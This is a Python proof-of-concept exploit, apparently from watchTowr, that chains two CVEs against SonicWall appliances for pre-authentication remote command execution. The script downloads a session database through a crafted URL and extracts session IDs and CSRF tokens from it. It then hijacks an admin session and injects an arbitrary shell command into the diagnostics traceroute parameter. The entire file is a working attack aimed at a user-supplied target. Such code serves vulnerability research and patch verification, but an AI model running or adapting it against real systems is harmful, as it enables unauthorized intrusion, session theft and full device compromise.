import requests
import argparse
from base64 import b64encode
import sqlite3


requests.packages.urllib3.disable_warnings()

parser = argparse.ArgumentParser()
parser.add_argument('-t', '--target', required=True, help='Target URL, e.g: https://192.168.8.153/')
parser.add_argument('-c', '--command', required=True, help='Command to execute')
args = parser.parse_args()
args.target = args.target.rstrip('/')

banner = """			 __         ___  ___________                   
	 __  _  ______ _/  |__ ____ |  |_\\__    ____\\____  _  ________ 
	 \\ \\/ \\/ \\__  \\    ___/ ___\\|  |  \\|    | /  _ \\ \\/ \\/ \\_  __ \\
	  \\     / / __ \\|  | \\  \\___|   Y  |    |(  <_> \\     / |  | \\/
	   \\/\\_/ (____  |__|  \\___  |___|__|__  | \\__  / \\/\\_/  |__|   
				  \\/          \\/     \\/                            

        watchTowr-vs-SonicWall-PreAuth-RCE-Chain.py

        (*) SonicWall Pre-Auth RCE Chain
        
          - Sina Kheirkhah (@SinSinology) of watchTowr (@watchTowrcyber)

        CVEs: [CVE-2023-44221, CVE-2024-38475]
"""
print(banner)

s = requests.Session()
s.headers.update({'User-Agent': 'User-Agent: Mozilla/5.0'})
s.verify = False


def download_db():
    url = f"{args.target}/tmp/temp.db%3f.1.1.1.1a-1.css"
    output_name  = "temp.db"
    try:
        response = s.get(url, timeout=5)
        if response.status_code == 200:
            with open(output_name, 'wb') as f:
                f.write(response.content)
            print(f"[*] Database downloaded successfully as {output_name}")
            return output_name
        else:
            print(f"[!] Failed to download the database. Status code: {response.status_code}")
    except requests.RequestException as e:
        print(f"[!] Error: {e}")
    
def extract_session(db_file):
    try:
        conn = sqlite3.connect(db_file)
        cursor = conn.cursor()
        cursor.execute("select sessionId,csrfToken from Sessions")
        rows = cursor.fetchall()
        if rows:
            session_id, csrf_token = rows[0]
            print(f"[*] Session ID: {session_id}")
            print(f"[*] CSRF Token: {csrf_token}")
            return session_id, csrf_token
        else:
            print("[!] No session found in the database.")
    except sqlite3.Error as e:
        print(f"[!] SQLite error: {e}")
    finally:
        if conn:
            conn.close()

def verify_session():
    url = f"{args.target}/spog/activeusers"
    try:
        response = s.get(url, timeout=5)
        if response.status_code == 200:
            if(response.json()['status'] == "done"):
                print("[*] Session is valid.")
                return True
            else:
                print("[*] Session is valid.")
                return False
        else:
            print("[!] Session is invalid.")
            return False
    except requests.RequestException as e:
        print(f"[!] Error: {e}")
        return False

def execute_command(command):
    url = f"{args.target}/spog/diagnostics"

    filler = '"'*140
    payload = f'tool=TRACEROUTE6_CMD&target=;{command};{filler}'
    _headers = {
        'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
    }

    try:
        response = s.post(url, data=payload, headers=_headers, timeout=5)
        if response.status_code == 200:
            print("[*] Command executed successfully.")
            return response.text
        else:
            print(f"[!] Failed to execute command. Status code: {response.status_code}")
    except requests.RequestException as e:
        print(f"[!] Error: {e}")

download_db()
session_id, csrf_token = extract_session("temp.db")
s.cookies.set("swap", b64encode(session_id.encode()).decode())
s.cookies.set("swcctn", csrf_token)
s.headers.update({'X-Csrf-Token': csrf_token})
res = verify_session()
if not res:
    print("[!] Session is invalid.")
    exit(1)

response = execute_command(args.command)
print(response)